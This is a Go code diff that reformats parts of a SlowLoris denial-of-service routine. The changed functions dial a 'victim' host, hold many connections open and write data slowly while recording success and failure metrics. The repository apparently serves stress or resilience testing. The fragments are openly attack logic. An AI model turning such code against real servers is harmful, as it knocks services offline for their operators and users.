@@ -57,6 +57,7 @@ func Start(stopChan chan bool, config *Config) error {
 		if targetURL.Scheme == "https" {
 			port = "443"
 		}
+
 		targetHostPort = net.JoinHostPort(targetHostPort, port)
 	}
 
@@ -84,14 +85,15 @@ func Start(stopChan chan bool, config *Config) error {
 
 func (s SlowLoris) dialWorker(stopChan chan bool, config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetURI *url.URL, requestHeader []byte) {
 	isTLS := targetURI.Scheme == "https"
+
 	for {
 		select {
 		case <-stopChan:
 			return
 		default:
 			time.Sleep(config.RampUpInterval)
-			conn := s.dialVictim(targetHostPort, isTLS)
-			if conn != nil {
+
+			if conn := s.dialVictim(targetHostPort, isTLS); conn != nil {
 				go s.doLoris(config, targetHostPort, conn, activeConnectionsCh, requestHeader)
 			}
 		}
@@ -186,18 +188,21 @@ func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.R
 			return
 		case <-time.After(config.SleepInterval):
 		}
+
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
 			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
 			log.Printf("Error when writing %d byte out of %d bytes: %v", i, config.ContentLength, err)
 
 			return
 		}
+
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess)
 	}
 }
 
 func (s SlowLoris) nullReader(conn io.Reader, ch chan<- int) {
 	defer func() { ch <- 1 }()
+
 	n, err := conn.Read(sharedReadBuf)
 	if err != nil {
 		log.Printf("Error when reading server response: %v", err)
